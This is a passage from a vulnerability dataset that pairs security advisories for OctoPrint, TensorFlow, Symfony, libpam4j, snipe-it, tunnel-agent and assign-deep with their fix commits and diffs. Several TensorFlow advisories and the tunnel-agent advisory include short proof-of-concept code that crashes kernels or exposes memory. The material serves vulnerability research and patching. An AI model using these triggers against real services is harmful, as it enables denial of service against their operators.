scenario.","published_date":"2022-05-19","chain_len":1,"project":"https:\/\/github.com\/octoprint\/octoprint","commit_href":"https:\/\/github.com\/octoprint\/octoprint\/commit\/8087528e4a7ddd15c7d95ff662deb5ef7de90045","commit_sha":"8087528e4a7ddd15c7d95ff662deb5ef7de90045","patch":"SINGLE","chain_ord":"['8087528e4a7ddd15c7d95ff662deb5ef7de90045']","before_first_fix_commit":"{'700034d028ff3518b563a7b4ba4dacc920142d07'}","last_fix_commit":"8087528e4a7ddd15c7d95ff662deb5ef7de90045","chain_ord_pos":1.0,"commit_datetime":"05\/11\/2022, 11:02:52","message":"\ud83d\udd12\ufe0f Sanitize and validate login redirect\n\nFixes an XSS and an open redirect issue.","author":"Gina H\u00e4u\u00dfge","comments":null,"stats":"{'additions': 11, 'deletions': 1, 'total': 12}","files":"{'src\/octoprint\/server\/views.py': {'additions': 11, 'deletions': 1, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/OctoPrint\/OctoPrint\/raw\/8087528e4a7ddd15c7d95ff662deb5ef7de90045\/src%2Foctoprint%2Fserver%2Fviews.py', 'patch': '@@ -8,6 +8,7 @@\\n import os\\n import re\\n from collections import defaultdict\\n+from urllib.parse import urlparse\\n \\n from flask import (\\n     Response,\\n@@ -170,7 +171,16 @@ def _add_additional_assets(hook):\\n def login():\\n     from flask_login import current_user\\n \\n-    redirect_url = request.args.get(\"redirect\", request.script_root + url_for(\"index\"))\\n+    default_redirect_url = request.script_root + url_for(\"index\")\\n+    redirect_url = request.args.get(\"redirect\", default_redirect_url)\\n+\\n+    parsed = urlparse(redirect_url)  # check if redirect url is valid\\n+    if parsed.scheme != \"\" or parsed.netloc != \"\":\\n+        _logger.warning(\\n+            f\"Got an invalid redirect URL with the login attempt, misconfiguration or attack attempt: {redirect_url}\"\\n+        )\\n+        redirect_url = default_redirect_url\\n+\\n     permissions = sorted(\\n         filter(\\n             lambda x: x is not None and isinstance(x, OctoPrintPermission),'}}","message_norm":"\ud83d\udd12\ufe0f sanitize and validate login redirect\n\nfixes an xss and an open redirect issue.","language":"en","entities":"[('sanitize', 'SECWORD', ''), ('validate', 'ACTION', ''), ('login', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('xss', 'SECWORD', ''), ('open redirect', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/octoprint\/server\/views.py'])","num_files":1.0},{"index":3395,"vuln_id":"GHSA-x83m-p7pv-ch8v","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/744009c9e5cc5d0447f0dc39d055f917e1fd9e16'}","dataset":"osv","summary":"Division by 0 in `QuantizedAdd` ### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedAdd`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([68, 228], shape=[2, 1], dtype=tf.quint8)\ny = tf.constant([], shape=[2, 0], dtype=tf.quint8)\n\nmin_x = tf.constant(10.723421015884028)\nmax_x = tf.constant(15.19578006631113)\nmin_y = tf.constant(-5.539003866682977)\nmax_y = tf.constant(42.18819949559947)\n\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f26b3f3418201479c264f2a02000880d8df151c\/tensorflow\/core\/kernels\/quantized_add_op.cc#L289-L295) computes a modulo operation without validating that the divisor is not zero.\n\n```cc\nvoid VectorTensorAddition(const T* vector_data, float min_vector,\n                          float max_vector, int64 vector_num_elements,\n                          const T* tensor_data, float min_tensor,\n                          float max_tensor, int64 tensor_num_elements,\n                          float output_min, float output_max, Toutput* output) {\n  for (int i = 0; i < tensor_num_elements; ++i) {\n    const int64 vector_i = i % vector_num_elements;\n    ...\n  }\n}\n```\n\nSince `vector_num_elements` is [determined based on input shapes](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f26b3f3418201479c264f2a02000880d8df151c\/tensorflow\/core\/kernels\/quantized_add_op.cc#L522-L544), a user can trigger scenarios where this quantity is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [744009c9e5cc5d0447f0dc39d055f917e1fd9e16](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/744009c9e5cc5d0447f0dc39d055f917e1fd9e16).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/744009c9e5cc5d0447f0dc39d055f917e1fd9e16","commit_sha":"744009c9e5cc5d0447f0dc39d055f917e1fd9e16","patch":"SINGLE","chain_ord":"['744009c9e5cc5d0447f0dc39d055f917e1fd9e16']","before_first_fix_commit":"{'6f26b3f3418201479c264f2a02000880d8df151c'}","last_fix_commit":"744009c9e5cc5d0447f0dc39d055f917e1fd9e16","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2021, 19:00:12","message":"Validate work in `QuantizedAdd`, ensure at least one element.\n\nPiperOrigin-RevId: 370127996\nChange-Id: I57c6f3e01afdeada84737820a131590137463855","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/quantized_add_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/744009c9e5cc5d0447f0dc39d055f917e1fd9e16\/tensorflow%2Fcore%2Fkernels%2Fquantized_add_op.cc', 'patch': '@@ -538,6 +538,8 @@ class QuantizedAddOp : public OpKernel {\\n         tensor_min = min_x;\\n         tensor_max = max_x;\\n       }\\n+      OP_REQUIRES(context, vector_num_elements > 0,\\n+                  errors::InvalidArgument(\"Must have some elements to add\"));\\n       VectorTensorAddition<T, Toutput>(\\n           vector_data, vector_min, vector_max, vector_num_elements, tensor_data,\\n           tensor_min, tensor_max, tensor_num_elements, min_z_value, max_z_value,'}}","message_norm":"validate work in `quantizedadd`, ensure at least one element.\n\npiperorigin-revid: 370127996\nchange-id: i57c6f3e01afdeada84737820a131590137463855","language":"en","entities":"[('validate', 'ACTION', ''), ('ensure', 'ACTION', ''), ('370127996', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_add_op.cc'])","num_files":1.0},{"index":3397,"vuln_id":"GHSA-x8h6-xgqx-jqgp","cwe_id":"{'CWE-908'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925'}","dataset":"osv","summary":"Undefined behavior and `CHECK`-fail in `FractionalMaxPoolGrad` ### Impact\nThe implementation of `tf.raw_ops.FractionalMaxPoolGrad` triggers an undefined behavior if one of the input tensors is empty:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([2, 3], shape=[1, 1, 1, 2], dtype=tf.int64)\norig_output = tf.constant([], dtype=tf.int64) \nout_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe code is also vulnerable to a denial of service attack as a `CHECK` condition becomes false and aborts the process\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([1], shape=[1], dtype=tf.int64)\norig_output = tf.constant([1], shape=[1], dtype=tf.int64)\nout_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) \ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/169054888d50ce488dfde9ca55d91d6325efbd5b\/tensorflow\/core\/kernels\/fractional_max_pool_op.cc#L215) fails to validate that input and output tensors are not empty and are of the same rank. Each of these unchecked assumptions is responsible for the above issues.\n\n### Patches\nWe have patched the issue in GitHub commit [32fdcbff9d06d010d908fcc4bd4b36eb3ce15925](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925","commit_sha":"32fdcbff9d06d010d908fcc4bd4b36eb3ce15925","patch":"SINGLE","chain_ord":"['32fdcbff9d06d010d908fcc4bd4b36eb3ce15925']","before_first_fix_commit":"{'169054888d50ce488dfde9ca55d91d6325efbd5b'}","last_fix_commit":"32fdcbff9d06d010d908fcc4bd4b36eb3ce15925","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 05:39:29","message":"Validate arguments of `FractionalMaxPoolGrad`\n\nPiperOrigin-RevId: 372274982\nChange-Id: If46b0c442efa4eaef635ce6a476717060420122c","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'tensorflow\/core\/kernels\/fractional_max_pool_op.cc': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925\/tensorflow%2Fcore%2Fkernels%2Ffractional_max_pool_op.cc', 'patch': '@@ -235,6 +235,20 @@ class FractionalMaxPoolGradOp : public OpKernel {\\n \\n     \/\/ Just to make it similar to FractionalMaxPoolOp.\\n     constexpr int tensor_in_and_out_dims = 4;\\n+    OP_REQUIRES(\\n+        context, tensor_in.dims() == tensor_in_and_out_dims,\\n+        errors::InvalidArgument(\"orig_input should be a tensor of rank 4, got \",\\n+                                tensor_in.DebugString()));\\n+    OP_REQUIRES(context, tensor_in.NumElements() > 0,\\n+                errors::InvalidArgument(\"orig_input must not be empty, got \",\\n+                                        tensor_in.DebugString()));\\n+    OP_REQUIRES(context, tensor_out.dims() == tensor_in_and_out_dims,\\n+                errors::InvalidArgument(\\n+                    \"orig_output should be a tensor of rank 4, got \",\\n+                    tensor_out.DebugString()));\\n+    OP_REQUIRES(context, tensor_out.NumElements() > 0,\\n+                errors::InvalidArgument(\"orig_output must not be empty, got \",\\n+                                        tensor_out.DebugString()));\\n     std::vector<int64> input_size(tensor_in_and_out_dims);\\n     std::vector<int64> output_size(tensor_in_and_out_dims);\\n     for (int i = 0; i < tensor_in_and_out_dims; ++i) {'}}","message_norm":"validate arguments of `fractionalmaxpoolgrad`\n\npiperorigin-revid: 372274982\nchange-id: if46b0c442efa4eaef635ce6a476717060420122c","language":"en","entities":"[('validate', 'ACTION', ''), ('372274982', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fractional_max_pool_op.cc'])","num_files":1.0},{"index":3400,"vuln_id":"GHSA-x92h-wmg2-6hp7","cwe_id":"{'CWE-89', 'CWE-79'}","score":9.8,"chain":"{'https:\/\/github.com\/symfony\/symfony\/commit\/944e60f083c3bffbc6a0b5112db127a10a66a8ec'}","dataset":"osv","summary":"Invalid HTTP method overrides allow possible XSS or other attacks in Symfony In Symfony before 2.7.51, 2.8.x before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, HTTP Methods provided as verbs or using the override header may be treated as trusted input, but they are not validated, possibly causing SQL injection or XSS. This is related to symfony\/http-foundation.","published_date":"2019-12-02","chain_len":1,"project":"https:\/\/github.com\/symfony\/symfony","commit_href":"https:\/\/github.com\/symfony\/symfony\/commit\/944e60f083c3bffbc6a0b5112db127a10a66a8ec","commit_sha":"944e60f083c3bffbc6a0b5112db127a10a66a8ec","patch":"SINGLE","chain_ord":"['944e60f083c3bffbc6a0b5112db127a10a66a8ec']","before_first_fix_commit":"{'b7bdf2ce435b0aeb8edb8349f0456f7ca3d21035'}","last_fix_commit":"944e60f083c3bffbc6a0b5112db127a10a66a8ec","chain_ord_pos":1.0,"commit_datetime":"04\/02\/2019, 16:28:16","message":"[HttpFoundation] reject invalid method override","author":"Nicolas Grekas","comments":"{'com_1': {'author': 'jirayutza1', 'datetime': '12\/04\/2019, 20:11:46', 'body': '944e60f'}}","stats":"{'additions': 29, 'deletions': 14, 'total': 43}","files":"{'src\/Symfony\/Component\/HttpFoundation\/Request.php': {'additions': 29, 'deletions': 14, 'changes': 43, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/symfony\/symfony\/raw\/944e60f083c3bffbc6a0b5112db127a10a66a8ec\/src%2FSymfony%2FComponent%2FHttpFoundation%2FRequest.php', 'patch': '@@ -1346,22 +1346,37 @@ public function setMethod($method)\\n      *\/\\n     public function getMethod()\\n     {\\n-        if (null === $this->method) {\\n-            $this->method = strtoupper($this->server->get(\\'REQUEST_METHOD\\', \\'GET\\'));\\n-\\n-            if (\\'POST\\' === $this->method) {\\n-                if ($method = $this->headers->get(\\'X-HTTP-METHOD-OVERRIDE\\')) {\\n-                    $this->method = strtoupper($method);\\n-                } elseif (self::$httpMethodParameterOverride) {\\n-                    $method = $this->request->get(\\'_method\\', $this->query->get(\\'_method\\', \\'POST\\'));\\n-                    if (\\\\is_string($method)) {\\n-                        $this->method = strtoupper($method);\\n-                    }\\n-                }\\n-            }\\n+        if (null !== $this->method) {\\n+            return $this->method;\\n+        }\\n+\\n+        $this->method = strtoupper($this->server->get(\\'REQUEST_METHOD\\', \\'GET\\'));\\n+\\n+        if (\\'POST\\' !== $this->method) {\\n+            return $this->method;\\n+        }\\n+\\n+        $method = $this->headers->get(\\'X-HTTP-METHOD-OVERRIDE\\');\\n+\\n+        if (!$method && self::$httpMethodParameterOverride) {\\n+            $method = $this->request->get(\\'_method\\', $this->query->get(\\'_method\\', \\'POST\\'));\\n+        }\\n+\\n+        if (!\\\\is_string($method)) {\\n+            return $this->method;\\n+        }\\n+\\n+        $method = strtoupper($method);\\n+\\n+        if (\\\\in_array($method, [\\'GET\\', \\'HEAD\\', \\'POST\\', \\'PUT\\', \\'DELETE\\', \\'CONNECT\\', \\'OPTIONS\\', \\'PATCH\\', \\'PURGE\\', \\'TRACE\\'], true)) {\\n+            return $this->method = $method;\\n+        }\\n+\\n+        if (!preg_match(\\'\/^[A-Z]++$\/D\\', $method)) {\\n+            throw new SuspiciousOperationException(sprintf(\\'Invalid method override \"%s\".\\', $method));\\n         }\\n \\n-        return $this->method;\\n+        return $this->method = $method;\\n     }\\n \\n     \/**'}}","message_norm":"[httpfoundation] reject invalid method override","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Symfony\/Component\/HttpFoundation\/Request.php'])","num_files":1.0},{"index":3405,"vuln_id":"GHSA-x9rg-q5fx-fx66","cwe_id":"{'CWE-20'}","score":6.5,"chain":"{'https:\/\/github.com\/kohsuke\/libpam4j\/commit\/02ffdff218283629ba4a902e7fe2fd44646abc21'}","dataset":"osv","summary":"Improper Input Validation in libpam4j It was found that libpam4j prior to 1.10 did not properly validate user accounts when authenticating. A user with a valid password for a disabled account would be able to bypass security restrictions and possibly access sensitive information.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/kohsuke\/libpam4j","commit_href":"https:\/\/github.com\/kohsuke\/libpam4j\/commit\/02ffdff218283629ba4a902e7fe2fd44646abc21","commit_sha":"02ffdff218283629ba4a902e7fe2fd44646abc21","patch":"SINGLE","chain_ord":"['02ffdff218283629ba4a902e7fe2fd44646abc21']","before_first_fix_commit":"{'f49e2838cb195b2dce1448393d8c88174ad80652'}","last_fix_commit":"02ffdff218283629ba4a902e7fe2fd44646abc21","chain_ord_pos":1.0,"commit_datetime":"05\/29\/2018, 18:11:55","message":"call pam_acct_mgmt to verify whether the user account is valid.\n\nThis fixes issue #18 and thus CVE-2017-12197","author":"Kohsuke Kawaguchi","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/main\/java\/org\/jvnet\/libpam\/PAM.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kohsuke\/libpam4j\/raw\/02ffdff218283629ba4a902e7fe2fd44646abc21\/src%2Fmain%2Fjava%2Forg%2Fjvnet%2Flibpam%2FPAM.java', 'patch': '@@ -124,7 +124,7 @@ public UnixUser authenticate(String username, String password) throws PAMExcepti\\n             check(libpam.pam_authenticate(pht,0),\"pam_authenticate failed\");\\n             check(libpam.pam_setcred(pht,0),\"pam_setcred failed\");\\n             \/\/ several different error code seem to be used to represent authentication failures\\n-\/\/            check(libpam.pam_acct_mgmt(pht,0),\"pam_acct_mgmt failed\");\\n+            check(libpam.pam_acct_mgmt(pht,0),\"pam_acct_mgmt failed\");\\n \\n             PointerByReference r = new PointerByReference();\\n             check(libpam.pam_get_item(pht,PAM_USER,r),\"pam_get_item failed\");'}}","message_norm":"call pam_acct_mgmt to verify whether the user account is valid.\n\nthis fixes issue #18 and thus cve-2017-12197","language":"en","entities":"[('verify', 'ACTION', ''), ('user account', 'SECWORD', ''), ('#18', 'ISSUE', ''), ('cve-2017-12197', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/jvnet\/libpam\/PAM.java'])","num_files":1.0},{"index":3407,"vuln_id":"GHSA-xc47-3rch-cv57","cwe_id":"{'CWE-284'}","score":5.4,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/0e5ef53c352754de2778ffa20c85da15fd6f7ae0'}","dataset":"osv","summary":"Improper Access Control in snipe-it Users with no system permissions are able to see and create personal access tokens","published_date":"2022-01-26","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/0e5ef53c352754de2778ffa20c85da15fd6f7ae0","commit_sha":"0e5ef53c352754de2778ffa20c85da15fd6f7ae0","patch":"SINGLE","chain_ord":"['0e5ef53c352754de2778ffa20c85da15fd6f7ae0']","before_first_fix_commit":"{'512dbfee7acfcafa1524c8b2fb4cc4ef96958d0b', 'eb8f23a888ccb2dc53a11c6dd240cbe8373500aa'}","last_fix_commit":"0e5ef53c352754de2778ffa20c85da15fd6f7ae0","chain_ord_pos":1.0,"commit_datetime":"01\/13\/2022, 09:36:52","message":"Merge pull request #10504 from snipe\/fixes\/auth_controls_on_api_key_creation\n\nFixes auth controls on api key creation","author":"snipe","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'app\/Http\/Controllers\/ProfileController.php': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/0e5ef53c352754de2778ffa20c85da15fd6f7ae0\/app%2FHttp%2FControllers%2FProfileController.php', 'patch': \"@@ -113,6 +113,12 @@ public function postIndex(ImageUploadRequest $request)\\n      *\/\\n     public function api()\\n     {\\n+\\n+        \/\/ Make sure the self.api permission has been granted\\n+        if (!Gate::allows('self.api')) {\\n+            abort(403);\\n+        }\\n+\\n         return view('account\/api');\\n     }\"}}","message_norm":"merge pull request #10504 from snipe\/fixes\/auth_controls_on_api_key_creation\n\nfixes auth controls on api key creation","language":"en","entities":"[('#10504', 'ISSUE', ''), ('auth_controls_on_api_key_creation', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('auth', 'SECWORD', ''), ('key', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/ProfileController.php'])","num_files":1.0},{"index":3409,"vuln_id":"GHSA-xc7v-wxcw-j472","cwe_id":"{'CWE-200'}","score":0.0,"chain":"{'https:\/\/github.com\/request\/tunnel-agent\/commit\/9ca95ec7219daface8a6fc2674000653de0922c0'}","dataset":"osv","summary":"Memory Exposure in tunnel-agent Versions of `tunnel-agent` before 0.6.0 are vulnerable to memory exposure.\n\nThis is exploitable if user supplied input is provided to the auth value and is a number.\n\nProof-of-concept:\n```js\nrequire('request')({\n  method: 'GET',\n  uri: 'http:\/\/www.example.com',\n  tunnel: true,\n  proxy:{\n    protocol: 'http:',\n    host:'127.0.0.1',\n    port:8080,\n    auth:USERSUPPLIEDINPUT \/\/ number\n  }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.6.0 or later.","published_date":"2019-06-03","chain_len":1,"project":"https:\/\/github.com\/request\/tunnel-agent","commit_href":"https:\/\/github.com\/request\/tunnel-agent\/commit\/9ca95ec7219daface8a6fc2674000653de0922c0","commit_sha":"9ca95ec7219daface8a6fc2674000653de0922c0","patch":"SINGLE","chain_ord":"['9ca95ec7219daface8a6fc2674000653de0922c0']","before_first_fix_commit":"{'8a7c86e6e2a1c3fa8577e5b0e14923d54c659552'}","last_fix_commit":"9ca95ec7219daface8a6fc2674000653de0922c0","chain_ord_pos":1.0,"commit_datetime":"03\/05\/2017, 00:29:52","message":"Use .from","author":"Mikeal Rogers","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/request\/tunnel-agent\/raw\/9ca95ec7219daface8a6fc2674000653de0922c0\/index.js', 'patch': \"@@ -128,7 +128,7 @@ TunnelingAgent.prototype.createSocket = function createSocket(options, cb) {\\n   if (connectOptions.proxyAuth) {\\n     connectOptions.headers = connectOptions.headers || {}\\n     connectOptions.headers['Proxy-Authorization'] = 'Basic ' +\\n-        new Buffer(connectOptions.proxyAuth).toString('base64')\\n+        Buffer.from(connectOptions.proxyAuth).toString('base64')\\n   }\\n \\n   debug('making CONNECT request')\"}}","message_norm":"use .from","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":3414,"vuln_id":"GHSA-xcvv-84j5-jw9h","cwe_id":"{'CWE-471'}","score":0.0,"chain":"{'https:\/\/github.com\/jonschlinkert\/assign-deep\/commit\/19953a8c089b0328c470acaaaf6accdfcb34da11'}","dataset":"osv","summary":"Prototype Pollution in assign-deep Versions of `assign-deep` before 0.4.7 are vulnerable to prototype pollution via merging functions.\n\n\n## Recommendation\n\nUpdate to version 0.4.7 or later.","published_date":"2018-07-26","chain_len":1,"project":"https:\/\/github.com\/jonschlinkert\/assign-deep","commit_href":"https:\/\/github.com\/jonschlinkert\/assign-deep\/commit\/19953a8c089b0328c470acaaaf6accdfcb34da11","commit_sha":"19953a8c089b0328c470acaaaf6accdfcb34da11","patch":"SINGLE","chain_ord":"['19953a8c089b0328c470acaaaf6accdfcb34da11']","before_first_fix_commit":"{'f6cba02d11a1d293593be0e942aff60bfd5a5711'}","last_fix_commit":"19953a8c089b0328c470acaaaf6accdfcb34da11","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2018, 16:20:22","message":"exclude __proto__","author":"doowb","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/assign-deep\/raw\/19953a8c089b0328c470acaaaf6accdfcb34da11\/index.js', 'patch': \"@@ -37,7 +37,7 @@ function extend(target, obj) {\\n   assignSymbols(target, obj);\\n \\n   for (var key in obj) {\\n-    if (hasOwn(obj, key)) {\\n+    if (key !== '__proto__' && hasOwn(obj, key)) {\\n       var val = obj[key];\\n       if (isObject(val)) {\\n         if (typeOf(target[key]) === 'undefined' && typeOf(val) === 'function') {\"}}","message_norm":"exclude __proto__","language":"pt","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":3415,"vuln_id":"GHSA-xcwj-wfcm-m23c","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd'}","dataset":"osv","summary":"Invalid validation in `SparseMatrixSparseCholesky` ### Impact\nAn attacker can trigger a null pointer dereference by providing an invalid `permutation` to `tf.raw_ops.SparseMatrixSparseCholesky`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([-10.0], dtype=np.float32)\ndense_shape = [1, 1]\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\ninput = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n\npermutation = tf.constant([], shape=[1, 0], dtype=tf.int32)\n \ntf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/080f1d9e257589f78b3ffb75debf584168aa6062\/tensorflow\/core\/kernels\/sparse\/sparse_cholesky_op.cc#L85-L86) fails to properly validate the input arguments: \n                          \n```cc \nvoid Compute(OpKernelContext* ctx) final {\n  ...\n  const Tensor& input_permutation_indices = ctx->input(1);\n  ...\n  ValidateInputs(ctx, *input_matrix, input_permutation_indices, &batch_size, &num_rows);\n  ...\n}\n\nvoid ValidateInputs(OpKernelContext* ctx,\n    const CSRSparseMatrix& sparse_matrix,\n    const Tensor& permutation_indices, int* batch_size,\n    int64* num_rows) {\n  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum<T>::value, ...)\n  ...\n}\n```\nAlthough `ValidateInputs` is called and there are checks in the body of this function, the code proceeds to the next line in `ValidateInputs` since [`OP_REQUIRES`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/080f1d9e257589f78b3ffb75debf584168aa6062\/tensorflow\/core\/framework\/op_requires.h#L41-L48) is a macro that only exits the current function.\n\n```cc\n#define OP_REQUIRES(CTX, EXP, STATUS)                     \\\n  do {                                                    \\\n    if (!TF_PREDICT_TRUE(EXP)) {                          \\\n      CheckNotInComputeAsync((CTX), \"OP_REQUIRES_ASYNC\"); \\\n      (CTX)->CtxFailure(__FILE__, __LINE__, (STATUS));    \\\n      return;                                             \\\n    }                                                     \\\n  } while (0)\n```\n\nThus, the first validation condition that fails in `ValidateInputs` will cause an early return from that function. However, the caller will continue execution from the next line. The fix is to either explicitly check `context->status()` or to convert `ValidateInputs` to return a `Status`.\n\n### Patches\nWe have patched the issue in GitHub commit [e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd","commit_sha":"e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd","patch":"SINGLE","chain_ord":"['e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd']","before_first_fix_commit":"{'080f1d9e257589f78b3ffb75debf584168aa6062'}","last_fix_commit":"e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 21:45:33","message":"Remove `OP_REQUIRES` call from helper function.\n\nSince `OP_REQUIRES` macro expands to a `return;` (among other), calling it in a helper function only ends the helper function's execution earlier, but the kernel will still run from start to end. Thus, all the expected validations are actually broken\/useless as the code ploughs through the next crash anyway.\n\nPiperOrigin-RevId: 369524386\nChange-Id: I54f6cf9328445675ccc392e661b04336b229c9da","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 34, 'deletions': 33, 'total': 67}","files":"{'tensorflow\/core\/kernels\/sparse\/sparse_cholesky_op.cc': 